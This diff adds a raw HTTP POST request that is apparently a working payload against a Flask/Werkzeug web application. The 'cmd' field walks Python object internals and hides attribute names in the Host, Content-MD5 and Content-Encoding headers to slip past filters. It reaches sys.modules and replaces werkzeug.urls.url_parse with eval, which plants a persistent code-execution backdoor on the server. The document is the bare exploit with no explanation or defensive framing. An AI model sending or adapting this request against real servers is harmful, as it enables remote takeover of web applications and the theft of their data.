@@ -1,0 +1,16 @@
+POST / HTTP/1.1
+Host: __loader__
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: experimentation_subject_id=IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang=zh-CN
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-MD5: _bootstrap_external
+Content-Encoding: werkzeug.urls
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 246
+
+cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval
